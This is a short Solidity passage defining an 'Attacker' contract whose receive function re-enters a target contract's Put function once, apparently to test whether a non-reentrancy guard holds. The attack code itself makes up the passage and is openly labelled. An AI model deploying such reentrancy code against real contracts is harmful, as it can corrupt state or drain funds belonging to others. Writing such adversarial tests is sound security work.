// Minimal adversarial re-entrant contract: during receive it attempts to call Put again
contract Attacker {
    address public target;
    bool public reentered;

    constructor(address _target) {
        target = _target;
        reentered = false;
    }

    // external function to start the attack: calls Put on target
    function doPut(uint256 _unlockTime) external payable {
        // call Put on target; if target is vulnerable (no require guard), its Put may trigger this contract's receive
        C(target).Put{value: msg.value}(_unlockTime);
    }

    // receive will attempt one re-entrant call into Put to trigger broken modifier effects
    receive() external payable {
        if (!reentered) {
            reentered = true;
            // attempt to re-enter Put with zero value (allowed) to manipulate state if nonReentrant_ is broken
            // wrap in low-level call to avoid bubbling reverts
            (bool ok, ) = target.call(abi.encodeWithSignature("Put(uint256)", 0));
            ok; // ignore result
        }
    }
